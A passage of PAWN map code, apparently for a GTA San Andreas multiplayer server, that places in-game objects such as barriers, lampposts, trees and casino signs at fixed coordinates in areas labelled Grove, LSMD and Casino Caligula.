	CreateDynamicObject(3578,2487.50000000,-2116.30004883,11.89999962,0.00000000,0.00000000,270.00000000); //object(dockbarr1_la) (12)
	CreateDynamicObject(3578,2474.19995117,-2116.50000000,11.89999962,0.00000000,0.00000000,270.00000000); //object(dockbarr1_la) (13)
	CreateDynamicObject(3578,2462.80004883,-2116.39990234,11.89999962,0.00000000,0.00000000,270.00000000); //object(dockbarr1_la) (14)
	CreateDynamicObject(3578,2451.80004883,-2116.39990234,11.89999962,0.00000000,0.00000000,270.00000000); //object(dockbarr1_la) (15)
	CreateDynamicObject(3567,2458.30004883,-2076.80004883,13.39999962,0.00000000,0.00000000,0.00000000); //object(lasnfltrail) (1)
	CreateDynamicObject(3458,2538.30004883,-2093.69995117,14.10000038,0.00000000,0.00000000,90.00000000); //object(vgncarshade1) (1)
	CreateDynamicObject(3567,2393.89990234,-2075.00000000,13.39999962,0.00000000,0.00000000,270.00000000); //object(lasnfltrail) (2)
	CreateDynamicObject(3567,2394.19995117,-2085.50000000,13.39999962,0.00000000,0.00000000,270.00000000); //object(lasnfltrail) (3)
	CreateDynamicObject(3567,2394.89990234,-2095.19995117,13.39999962,0.00000000,0.00000000,270.00000000); //object(lasnfltrail) (4)
	CreateDynamicObject(3567,2395.69995117,-2105.39990234,13.39999962,0.00000000,0.00000000,270.00000000); //object(lasnfltrail) (5)
	CreateDynamicObject(3567,2396.50000000,-2115.39990234,13.39999962,0.00000000,0.00000000,270.00000000); //object(lasnfltrail) (6)
	CreateDynamicObject(3567,2397.39990234,-2126.60009766,13.39999962,0.00000000,0.00000000,270.00000000); //object(lasnfltrail) (7)
	CreateDynamicObject(3567,2398.00000000,-2137.60009766,13.39999962,0.00000000,0.00000000,270.00000000); //object(lasnfltrail) (8)
	CreateDynamicObject(16477,2650.19995117,-2130.89990234,12.50000000,0.00000000,0.00000000,90.00000000); //object(des_stwngas1) (1)
	CreateDynamicObject(1686,2649.89990234,-2118.50000000,12.69999981,0.00000000,0.00000000,70.00000000); //object(petrolpumpnew) (1)
	CreateDynamicObject(1686,2651.30004883,-2112.50000000,12.69999981,0.00000000,0.00000000,69.99938965); //object(petrolpumpnew) (3)
	CreateDynamicObject(11417,2537.89990234,-2122.60009766,17.39999962,0.00000000,0.00000000,0.00000000); //object(xenonsign2_sfse) (1)
	CreateDynamicObject(3864,2636.00000000,-2128.00000000,18.60000038,0.00000000,0.00000000,230.00000000); //object(ws_floodlight) (1)

	//                          Ext. grove
	CreateDynamicObject(947,2500.69995117,-1667.30004883,14.60000038,0.00000000,0.00000000,94.00000000); //object(bskballhub_lax01) (1)
	CreateDynamicObject(947,2474.00000000,-1665.90002441,14.60000038,0.00000000,0.00000000,273.99902344); //object(bskballhub_lax01) (2)
	CreateDynamicObject(17513,2490.10009766,-1664.59997559,4.40000010,0.00000000,0.00000000,270.00000000); //object(lae2_ground04) (1)
	CreateDynamicObject(17969,2467.50000000,-1658.50000000,12.50000000,0.00000000,90.00000000,0.00000000); //object(hub_graffitti) (1)
	CreateDynamicObject(3092,2534.89990234,-1667.59997559,15.39999962,0.00000000,0.00000000,268.00000000); //object(dead_tied_cop) (1)
	CreateDynamicObject(3006,2481.69995117,-1651.80004883,12.50000000,0.00000000,0.00000000,0.00000000); //object(smash_box_brk) (1)
	CreateDynamicObject(16151,2533.39990234,-1666.80004883,14.50000000,0.00000000,0.00000000,0.00000000); //object(ufo_bar) (1)
	CreateDynamicObject(3051,2521.30004883,-1671.19995117,15.19999981,0.00000000,0.00000000,0.00000000); //object(lift_dr) (1)
	CreateDynamicObject(3051,2521.39990234,-1671.19995117,16.70000076,0.00000000,0.00000000,0.00000000); //object(lift_dr) (2)
	CreateDynamicObject(1491,2534.60009766,-1670.80004883,14.00000000,0.00000000,0.00000000,90.00000000); //object(gen_doorint01) (1)
	CreateDynamicObject(1679,2526.79980469,-1669.69921875,15.00000000,0.00000000,0.00000000,0.00000000); //object(chairsntableml) (1)
	CreateDynamicObject(1670,2526.69921875,-1669.89941406,15.39999962,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (1)
	CreateDynamicObject(1670,2526.69995117,-1669.40002441,15.39999962,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (2)
	CreateDynamicObject(1670,2532.39990234,-1669.00000000,15.10000038,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (3)
	CreateDynamicObject(1670,2532.50000000,-1668.00000000,15.10000038,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (4)
	CreateDynamicObject(1670,2532.30004883,-1666.50000000,15.10000038,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (5)
	CreateDynamicObject(1670,2532.39990234,-1665.00000000,15.10000038,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (6)
	CreateDynamicObject(1485,2526.60009766,-1669.69995117,15.39999962,0.00000000,0.00000000,0.00000000); //object(cj_ciggy) (1)
	CreateDynamicObject(1485,2526.89990234,-1669.69995117,15.39999962,0.00000000,0.00000000,0.00000000); //object(cj_ciggy) (2)
	CreateDynamicObject(1679,2524.60009766,-1666.59997559,15.00000000,0.00000000,0.00000000,0.00000000); //object(chairsntableml) (1)
	CreateDynamicObject(1670,2524.60009766,-1666.80004883,15.39999962,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (1)
	CreateDynamicObject(1670,2524.39990234,-1666.40002441,15.39999962,0.00000000,0.00000000,0.00000000); //object(propcollecttable) (1)
	CreateDynamicObject(1946,2487.30004883,-1666.19995117,12.60000038,0.00000000,0.00000000,0.00000000); //object(baskt_ball_hi) (1)
	CreateDynamicObject(1447,2482.10009766,-1689.19995117,13.10000038,0.00000000,0.00000000,0.00000000); //object(dyn_mesh_4) (1)
	CreateDynamicObject(2891,2535.00000000,-1666.80004883,14.19999981,0.00000000,0.00000000,0.00000000); //object(kmb_packet) (1)
	CreateDynamicObject(2891,2535.19995117,-1666.09997559,14.19999981,0.00000000,0.00000000,0.00000000); //object(kmb_packet) (2)
	CreateDynamicObject(2891,2535.50000000,-1666.69995117,14.19999981,0.00000000,0.00000000,0.00000000); //object(kmb_packet) (3)
	CreateDynamicObject(2891,2535.50000000,-1666.69995117,14.39999962,0.00000000,0.00000000,0.00000000); //object(kmb_packet) (4)
	CreateDynamicObject(2891,2535.50000000,-1666.69995117,14.60000038,0.00000000,0.00000000,0.00000000); //object(kmb_packet) (5)
	CreateDynamicObject(2891,2535.19995117,-1666.09997559,14.39999962,0.00000000,0.00000000,0.00000000); //object(kmb_packet) (6)
	CreateDynamicObject(2891,2535.19995117,-1666.09997559,14.60000038,0.00000000,0.00000000,0.00000000); //object(kmb_packet) (7)
	CreateDynamicObject(910,2464.89990234,-1650.80004883,13.69999981,0.00000000,0.00000000,0.00000000); //object(bust_cabinet_4) (1)
	CreateDynamicObject(3119,2507.50000000,-1670.80004883,12.69999981,0.00000000,0.00000000,0.00000000); //object(cs_ry_props) (1)
	CreateDynamicObject(3119,2497.80004883,-1659.80004883,12.69999981,0.00000000,0.00000000,0.00000000); //object(cs_ry_props) (2)
	CreateDynamicObject(1415,2478.60009766,-1687.59997559,12.50000000,0.00000000,0.00000000,180.00000000); //object(dyn_dumpster) (1)
	CreateDynamicObject(1264,2476.10009766,-1653.19995117,12.89999962,0.00000000,0.00000000,0.00000000); //object(blackbag1) (1)
	CreateDynamicObject(1264,2503.50000000,-1651.19995117,12.89999962,0.00000000,0.00000000,0.00000000); //object(blackbag1) (2)
	CreateDynamicObject(3380,2448.30004883,-1664.50000000,12.50000000,0.00000000,0.00000000,262.00000000); //object(ce_hairpinl) (1)
	CreateDynamicObject(1528,2422.89990234,-1682.50000000,14.80000019,0.00000000,0.00000000,0.00000000); //object(tag_seville) (1)
	CreateDynamicObject(1528,2478.30004883,-1660.40002441,12.39999962,0.00000000,90.00000000,0.00000000); //object(tag_seville) (2)
	CreateDynamicObject(1528,2489.69995117,-1674.19995117,12.39999962,0.00000000,90.00000000,0.00000000); //object(tag_seville) (3)
	CreateDynamicObject(1528,2435.50000000,-1680.90002441,14.69999981,0.00000000,0.00000000,270.00000000); //object(tag_seville) (4)
	CreateDynamicObject(1226,2509.00000000,-1674.30004883,16.39999962,0.00000000,0.00000000,344.00000000); //object(lamppost3) (1)
	CreateDynamicObject(1226,2478.30004883,-1653.19995117,16.39999962,0.00000000,0.00000000,107.99841309); //object(lamppost3) (2)
	CreateDynamicObject(1226,2456.50000000,-1653.59997559,16.39999962,0.00000000,0.00000000,93.99560547); //object(lamppost3) (3)
	CreateDynamicObject(618,2455.89990234,-1684.40002441,12.50000000,0.00000000,0.00000000,0.00000000); //object(veg_treea3) (1)
	CreateDynamicObject(618,2505.39990234,-1648.80004883,12.50000000,0.00000000,0.00000000,0.00000000); //object(veg_treea3) (2)
	CreateDynamicObject(647,2505.80004883,-1648.50000000,14.00000000,0.00000000,0.00000000,0.00000000); //object(new_bushsm) (1)
   	//                          Ext. LSMD
	CreateDynamicObject(966,1209.90002441,-1291.69995117,12.39999962,0.00000000,0.00000000,0.00000000); //object(bar_gatebar01) (1)
	CreateDynamicObject(966,1210.09997559,-1385.19995117,12.19999981,0.00000000,0.00000000,0.00000000); //object(bar_gatebar01) (2)
	CreateDynamicObject(979,1195.90002441,-1385.00000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(sub_roadleft) (1)
	CreateDynamicObject(979,1195.89941406,-1385.00000000,13.10000038,0.00000000,0.00000000,180.00000000); //object(sub_roadleft) (2)
	CreateDynamicObject(979,1196.19995117,-1291.50000000,13.10000038,0.00000000,0.00000000,179.99450684); //object(sub_roadleft) (3)
	CreateDynamicObject(979,1196.19921875,-1291.50000000,13.10000038,0.00000000,0.00000000,359.99450684); //object(sub_roadleft) (4)
	CreateDynamicObject(996,1190.30004883,-1291.80004883,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (1)
	CreateDynamicObject(996,1190.30004883,-1299.90002441,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (2)
	CreateDynamicObject(996,1190.19995117,-1342.09997559,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (3)
	CreateDynamicObject(996,1190.19995117,-1350.19995117,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (4)
	CreateDynamicObject(996,1190.19995117,-1358.30004883,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (5)
	CreateDynamicObject(996,1190.19995117,-1366.40002441,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (6)
	CreateDynamicObject(996,1190.19995117,-1374.50000000,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (7)
	CreateDynamicObject(996,1211.30004883,-1377.50000000,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (8)
	CreateDynamicObject(996,1211.30004883,-1369.40002441,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (9)
	CreateDynamicObject(996,1211.30004883,-1361.30004883,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (10)
	CreateDynamicObject(996,1211.30004883,-1353.19995117,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (11)
	CreateDynamicObject(996,1211.30004883,-1345.09997559,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (12)
	CreateDynamicObject(996,1211.30004883,-1337.00000000,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (13)
	CreateDynamicObject(996,1211.30004883,-1328.90002441,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (14)
	CreateDynamicObject(996,1211.30004883,-1320.80004883,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (15)
	CreateDynamicObject(996,1211.30004883,-1312.69995117,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (16)
	CreateDynamicObject(996,1211.30004883,-1304.59997559,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (17)
	CreateDynamicObject(996,1211.30004883,-1296.50000000,13.30000019,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (18)
	CreateDynamicObject(3850,1180.50000000,-1333.90002441,13.69999981,0.00000000,0.00000000,179.99450684); //object(carshowbann_sfsx) (3)
	CreateDynamicObject(3850,1180.50000000,-1330.69995117,13.69999981,0.00000000,0.00000000,179.99450684); //object(carshowbann_sfsx) (4)
	CreateDynamicObject(3850,1178.19995117,-1329.00000000,13.50000000,0.00000000,0.00000000,270.00000000); //object(carshowbann_sfsx) (5)
	CreateDynamicObject(3850,1178.00000000,-1335.59997559,13.50000000,0.00000000,0.00000000,270.00000000); //object(carshowbann_sfsx) (6)
	CreateDynamicObject(3850,1174.00000000,-1335.59997559,13.50000000,0.00000000,0.00000000,269.98901367); //object(carshowbann_sfsx) (7)
	CreateDynamicObject(870,1174.69995117,-1334.00000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (1)
	CreateDynamicObject(870,1178.00000000,-1333.90002441,13.19999981,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (2)
	CreateDynamicObject(870,1178.09997559,-1330.69995117,13.19999981,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (3)
	CreateDynamicObject(870,1175.19995117,-1330.90002441,13.19999981,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (4)
	CreateDynamicObject(1215,1180.19995117,-1329.09997559,13.69999981,0.00000000,0.00000000,0.00000000); //object(bollardlight) (1)
	CreateDynamicObject(1215,1180.09997559,-1335.50000000,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (2)
	CreateDynamicObject(1215,1176.00000000,-1335.59997559,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (3)
	CreateDynamicObject(1215,1176.30004883,-1329.19995117,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (4)
	CreateDynamicObject(3850,1180.40002441,-1316.69995117,13.69999981,0.00000000,0.00000000,179.99450684); //object(carshowbann_sfsx) (8)
	CreateDynamicObject(3850,1180.40002441,-1313.50000000,13.69999981,0.00000000,0.00000000,179.99450684); //object(carshowbann_sfsx) (9)
	CreateDynamicObject(3850,1178.59997559,-1311.80004883,13.50000000,0.00000000,0.00000000,269.99450684); //object(carshowbann_sfsx) (10)
	CreateDynamicObject(3850,1174.69995117,-1311.80004883,13.50000000,0.00000000,0.00000000,269.98901367); //object(carshowbann_sfsx) (11)
	CreateDynamicObject(3850,1178.19995117,-1318.30004883,13.50000000,0.00000000,0.00000000,269.98901367); //object(carshowbann_sfsx) (12)
	CreateDynamicObject(1215,1176.40002441,-1318.40002441,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (5)
	CreateDynamicObject(1215,1180.09997559,-1318.30004883,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (6)
	CreateDynamicObject(1215,1176.59997559,-1311.90002441,13.60000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (8)
	CreateDynamicObject(870,1174.50000000,-1316.50000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (5)
	CreateDynamicObject(870,1178.50000000,-1316.50000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (6)
	CreateDynamicObject(870,1178.50000000,-1313.50000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (7)
	CreateDynamicObject(870,1175.09997559,-1313.59997559,13.19999981,0.00000000,0.00000000,0.00000000); //object(veg_pflowers2wee) (8)
	CreateDynamicObject(1226,1210.59997559,-1312.19995117,16.29999924,0.00000000,0.00000000,0.00000000); //object(lamppost3) (2)
	CreateDynamicObject(1226,1210.80004883,-1328.50000000,16.29999924,0.00000000,0.00000000,0.00000000); //object(lamppost3) (3)
	CreateDynamicObject(1226,1210.69995117,-1320.19995117,16.29999924,0.00000000,0.00000000,0.00000000); //object(lamppost3) (4)
	CreateDynamicObject(1226,1211.00000000,-1344.69995117,16.29999924,0.00000000,0.00000000,0.00000000); //object(lamppost3) (5)
	CreateDynamicObject(1226,1211.09997559,-1352.80004883,16.29999924,0.00000000,0.00000000,0.00000000); //object(lamppost3) (6)
	CreateDynamicObject(1226,1211.19995117,-1360.90002441,16.29999924,0.00000000,0.00000000,0.00000000); //object(lamppost3) (7)
	CreateDynamicObject(1226,1211.40002441,-1376.69995117,16.29999924,0.00000000,0.00000000,0.00000000); //object(lamppost3) (8)
	CreateDynamicObject(1226,1190.69995117,-1373.59997559,16.29999924,0.00000000,0.00000000,180.00000000); //object(lamppost3) (9)
	CreateDynamicObject(1226,1190.69995117,-1365.59997559,16.29999924,0.00000000,0.00000000,179.99450684); //object(lamppost3) (10)
	CreateDynamicObject(1226,1190.50000000,-1357.50000000,16.29999924,0.00000000,0.00000000,179.99450684); //object(lamppost3) (11)
	CreateDynamicObject(1226,1190.59997559,-1341.30004883,16.29999924,0.00000000,0.00000000,179.99450684); //object(lamppost3) (12)
	CreateDynamicObject(1226,1190.69995117,-1307.30004883,16.29999924,0.00000000,0.00000000,179.99450684); //object(lamppost3) (13)
	CreateDynamicObject(3508,1201.09997559,-1379.19995117,12.39999962,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (2)
	CreateDynamicObject(3508,1200.80004883,-1367.00000000,12.39999962,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (3)
	CreateDynamicObject(3508,1200.90002441,-1355.50000000,12.39999962,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (4)
	CreateDynamicObject(3508,1200.90002441,-1343.90002441,12.39999962,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (5)
	CreateDynamicObject(3508,1200.90002441,-1314.90002441,12.39999962,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (6)
	CreateDynamicObject(3508,1201.09997559,-1303.40002441,12.39999962,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (7)
	CreateDynamicObject(3508,1201.09997559,-1292.30004883,12.39999962,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_g02) (8)
	CreateDynamicObject(646,1172.59997559,-1328.00000000,15.80000019,0.00000000,0.00000000,0.00000000); //object(veg_palmkb14) (1)
	CreateDynamicObject(646,1172.40002441,-1319.69995117,15.80000019,0.00000000,0.00000000,0.00000000); //object(veg_palmkb14) (2)
	CreateDynamicObject(638,1181.09997559,-1330.59997559,13.30000019,0.00000000,0.00000000,0.00000000); //object(kb_planter_bush) (2)
	CreateDynamicObject(638,1181.19995117,-1334.30004883,13.30000019,0.00000000,0.00000000,0.00000000); //object(kb_planter_bush) (3)
	CreateDynamicObject(638,1181.40002441,-1317.19995117,13.30000019,0.00000000,0.00000000,0.00000000); //object(kb_planter_bush) (4)
	CreateDynamicObject(638,1181.30004883,-1313.30004883,13.30000019,0.00000000,0.00000000,0.00000000); //object(kb_planter_bush) (5)
	CreateDynamicObject(3920,1172.69921875,-1348.89941406,20.50000000,0.00000000,0.00000000,270.00000000); //object(lib_veg3) (1)
	CreateDynamicObject(3920,1172.59997559,-1361.50000000,20.50000000,0.00000000,0.00000000,270.00000000); //object(lib_veg3) (2)
	CreateDynamicObject(1597,1200.69995117,-1373.19995117,15.00000000,0.00000000,0.00000000,0.00000000); //object(cntrlrsac1) (1)
	CreateDynamicObject(1597,1200.69995117,-1361.19995117,15.00000000,0.00000000,0.00000000,0.00000000); //object(cntrlrsac1) (2)
	CreateDynamicObject(1597,1200.59997559,-1349.69995117,15.00000000,0.00000000,0.00000000,0.00000000); //object(cntrlrsac1) (3)
	CreateDynamicObject(1597,1200.69995117,-1309.19995117,15.00000000,0.00000000,0.00000000,0.00000000); //object(cntrlrsac1) (4)
	CreateDynamicObject(1597,1200.69995117,-1297.80004883,15.00000000,0.00000000,0.00000000,0.00000000); //object(cntrlrsac1) (5)
	CreateDynamicObject(1364,1173.90002441,-1338.90002441,13.80000019,0.00000000,0.00000000,90.00000000); //object(cj_bush_prop) (1)
	CreateDynamicObject(1364,1172.00000000,-1308.50000000,13.80000019,0.00000000,0.00000000,90.00000000); //object(cj_bush_prop) (2)
	CreateDynamicObject(4639,1201.00000000,-1385.30004883,13.89999962,0.00000000,0.00000000,0.00000000); //object(paypark_lan02) (1)
	CreateDynamicObject(10009,1179.40002441,-1359.40002441,15.30000019,0.00000000,0.00000000,94.00000000); //object(fer_cars3_sfe) (1)
	CreateDynamicObject(983,1182.09997559,-1351.00000000,19.10000038,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (1)
	CreateDynamicObject(983,1182.09997559,-1346.19995117,19.10000038,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (2)
	CreateDynamicObject(984,1175.69995117,-1342.90002441,19.10000038,0.00000000,0.00000000,270.00000000); //object(fenceshit2) (2)
	CreateDynamicObject(2748,1173.80004883,-1343.69995117,19.00000000,0.00000000,0.00000000,0.00000000); //object(cj_donut_chair2) (1)
	CreateDynamicObject(2802,1179.19995117,-1346.00000000,18.79999924,0.00000000,0.00000000,0.00000000); //object(castable1) (1)
	CreateDynamicObject(2800,1179.09997559,-1346.09997559,19.00000000,0.00000000,0.00000000,0.00000000); //object(castable2top) (1)
	CreateDynamicObject(2748,1173.80004883,-1346.40002441,19.00000000,0.00000000,0.00000000,180.00000000); //object(cj_donut_chair2) (2)
	CreateDynamicObject(2762,1174.00000000,-1345.19995117,18.89999962,0.00000000,0.00000000,0.00000000); //object(cj_chick_table) (1)
	CreateDynamicObject(2800,1174.40002441,-1345.19995117,19.20000076,0.00000000,0.00000000,0.00000000); //object(castable2top) (2)
	CreateDynamicObject(2800,1173.50000000,-1345.30004883,19.20000076,0.00000000,0.00000000,0.00000000); //object(castable2top) (3)
	CreateDynamicObject(1726,1175.00000000,-1349.90002441,18.50000000,0.00000000,0.00000000,0.00000000); //object(mrk_seating2) (1)
	CreateDynamicObject(1726,1176.80004883,-1352.90002441,18.50000000,0.00000000,0.00000000,180.00000000); //object(mrk_seating2) (2)
	CreateDynamicObject(1723,1181.50000000,-1349.69995117,18.50000000,0.00000000,0.00000000,270.00000000); //object(mrk_seating1) (1)
	CreateDynamicObject(1723,1181.50000000,-1346.19995117,18.50000000,0.00000000,0.00000000,270.00000000); //object(mrk_seating1) (2)
	CreateDynamicObject(14806,1177.59997559,-1343.40002441,19.50000000,0.00000000,0.00000000,0.00000000); //object(bdupshifi) (1)
	CreateDynamicObject(2700,1172.90002441,-1350.40002441,22.50000000,0.00000000,18.00000000,0.00000000); //object(cj_sex_tv2) (1)
	CreateDynamicObject(2452,1173.50000000,-1348.69995117,18.50000000,0.00000000,0.00000000,90.00000000); //object(cj_ff_fridge2) (1)
	CreateDynamicObject(2229,1182.09997559,-1343.40002441,18.39999962,0.00000000,0.00000000,330.00000000); //object(swank_speaker) (1)
	CreateDynamicObject(1717,1173.59997559,-1351.80004883,18.50000000,0.00000000,0.00000000,40.00000000); //object(telly_low_test) (1)
	CreateDynamicObject(1547,1178.69995117,-1353.90002441,18.50000000,0.00000000,0.00000000,0.00000000); //object(cj_b_pish_t) (1)
	CreateDynamicObject(2433,1173.30004883,-1353.69995117,18.50000000,0.00000000,0.00000000,90.00000000); //object(cj_ff_disp1) (1)
	CreateDynamicObject(983,1174.59997559,-1354.30004883,19.10000038,0.00000000,0.00000000,270.00000000); //object(fenceshit3) (3)
	CreateDynamicObject(3877,1181.40002441,-1353.90002441,19.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(4003,1174.19995117,-1324.30004883,33.00000000,0.00000000,0.00000000,270.00000000); //object(lacityhalltrans_lan) (2)
	CreateDynamicObject(987,1137.69995117,-1347.50000000,12.00000000,0.00000000,0.00000000,0.00000000); //object(elecfence_bar) (1)
	CreateDynamicObject(3475,1147.00000000,-1292.40002441,15.00000000,0.00000000,0.00000000,270.00000000); //object(vgsn_fncelec_pst) (1)
	CreateDynamicObject(3475,1130.09997559,-1292.30004883,15.00000000,0.00000000,0.00000000,270.00000000); //object(vgsn_fncelec_pst) (2)
	CreateDynamicObject(3578,1138.59997559,-1292.19995117,11.89999962,0.00000000,0.00000000,0.00000000); //object(dockbarr1_la) (1)
	CreateDynamicObject(987,1089.40002441,-1334.90002441,12.00000000,0.00000000,0.00000000,90.00000000); //object(elecfence_bar) (2)
	CreateDynamicObject(7191,1150.09997559,-1333.30004883,7.69999981,270.00000000,180.00000000,0.00000000); //object(vegasnnewfence2b) (1)
	CreateDynamicObject(3051,1149.90002441,-1332.69995117,19.70000076,0.00000000,0.00000000,46.50000000); //object(lift_dr) (1)
	CreateDynamicObject(3051,1149.90002441,-1333.90002441,19.70000076,0.00000000,0.00000000,46.49963379); //object(lift_dr) (2)
	CreateDynamicObject(3051,1157.50000000,-1334.00000000,31.89999962,0.00000000,0.00000000,46.49963379); //object(lift_dr) (3)
	CreateDynamicObject(3051,1157.50000000,-1332.80004883,31.89999962,0.00000000,0.00000000,46.49963379); //object(lift_dr) (4)
	CreateDynamicObject(3361,1147.69995117,-1314.50000000,16.20000076,0.00000000,0.00000000,88.00000000); //object(cxref_woodstair) (1)
	CreateDynamicObject(3361,1147.90002441,-1308.30004883,12.10000038,0.00000000,0.00000000,87.99499512); //object(cxref_woodstair) (2)
	CreateDynamicObject(3934,1156.50000000,-1297.59997559,30.50000000,0.00000000,0.00000000,0.00000000); //object(helipad01) (1)
	CreateDynamicObject(3934,1164.30004883,-1317.50000000,30.50000000,0.00000000,0.00000000,0.00000000); //object(helipad01) (2)
	CreateDynamicObject(7191,1145.40002441,-1325.30004883,14.60000038,0.00000000,0.00000000,180.00549316); //object(vegasnnewfence2b) (2)
	CreateDynamicObject(1251,1141.59997559,-1340.09997559,12.69999981,0.00000000,0.00000000,0.00000000); //object(smashbar) (1)
	CreateDynamicObject(1251,1137.09997559,-1340.19995117,12.69999981,0.00000000,0.00000000,0.00000000); //object(smashbar) (2)
	CreateDynamicObject(1251,1145.30004883,-1340.09997559,12.69999981,0.00000000,0.00000000,0.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,1133.09997559,-1340.30004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(smashbar) (4)
	CreateDynamicObject(1251,1136.50000000,-1343.80004883,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (5)
	CreateDynamicObject(1251,1143.30004883,-1343.80004883,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (6)

	//                         Casino Caligula
	CreateDynamicObject(2987,2147.80004883,1604.69995117,1006.40002441,0.00000000,0.00000000,180.00000000); //object(lxr_motel_doorsim) (1)
	CreateDynamicObject(2987,2147.89990234,1604.69995117,1008.79998779,0.00000000,0.00000000,179.99450684); //object(lxr_motel_doorsim) (2)
    CreateDynamicObject(3660,1177.09997559,-1732.69995117,14.19999981,0.00000000,0.00000000,90.00000000); //object(lasairfbed_las) (1)
    CreateDynamicObject(3660,1177.00000000,-1756.59997559,14.19999981,0.00000000,0.00000000,90.00000000); //object(lasairfbed_las) (2)
    CreateDynamicObject(3660,1177.09997559,-1777.80004883,14.19999981,0.00000000,0.00000000,90.00000000); //object(lasairfbed_las) (3)
    CreateDynamicObject(718,1177.39941406,-1743.69921875,12.60000038,0.00000000,0.00000000,0.00000000); //object(vgs_palm04) (2)
    CreateDynamicObject(718,1177.39941406,-1745.69921875,12.60000038,0.00000000,0.00000000,0.00000000); //object(vgs_palm04) (3)
    CreateDynamicObject(3660,1177.09960938,-1816.69921875,14.19999981,0.00000000,0.00000000,90.00000000); //object(lasairfbed_las) (4)
    CreateDynamicObject(3660,1177.09997559,-1834.19995117,14.19999981,0.00000000,0.00000000,90.00000000); //object(lasairfbed_las) (5)
    CreateDynamicObject(14628,1214.89941406,-1757.89941406,27.29999924,43.99475098,0.00000000,45.99975586); //object(ab_caligulasfront) (1)
    CreateDynamicObject(3437,1204.09960938,-1762.50000000,12.89999962,0.00000000,0.00000000,253.99841309); //object(ballypllr01_lvs) (1)
    CreateDynamicObject(3437,1221.59960938,-1745.29980469,12.89999962,0.00000000,0.00000000,191.99707031); //object(ballypllr01_lvs) (2)
    CreateDynamicObject(7315,1253.50000000,-1763.30004883,45.79999924,0.00000000,0.00000000,139.99499512); //object(vgsn_blucasign) (2)
    CreateDynamicObject(8618,1193.59997559,-1775.80004883,25.60000038,0.00000000,0.00000000,90.00000000); //object(ceasersign_lvs) (2)
    CreateDynamicObject(10236,1280.09997559,-1785.19995117,23.60000038,0.00000000,0.00000000,180.00000000); //object(hotelbits_sfe06) (1)
    CreateDynamicObject(14628,1253.69995117,-1799.30004883,27.29999924,359.99475098,0.00000000,227.99974060); //object(ab_caligulasfront) (2)
    CreateDynamicObject(7315,1191.39941406,-1845.09960938,26.20000076,0.00000000,0.00000000,179.99450684); //object(vgsn_blucasign) (3)
    CreateDynamicObject(14626,1203.90002441,-1803.59997559,29.00000000,0.00000000,0.00000000,0.00000000); //object(mafcassigns1) (1)
    CreateDynamicObject(982,1189.80004883,-1829.40002441,13.30000019,0.00000000,0.00000000,0.00000000); //object(fenceshit) (1)
    CreateDynamicObject(984,1196.19921875,-1842.19921875,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit2) (1)
    CreateDynamicObject(8394,1255.40002441,-1737.59997559,24.20000076,0.00000000,0.00000000,0.00000000); //object(vgsbox10sgn_lvs) (1)
    CreateDynamicObject(1309,1226.69995117,-1805.40002441,34.79999924,0.00000000,0.00000000,282.00000000); //object(bigbillbrd) (1)
    CreateDynamicObject(7288,1225.59997559,-1805.00000000,41.50000000,0.00000000,0.00000000,101.74990845); //object(vgs_fmtcasgn) (3)
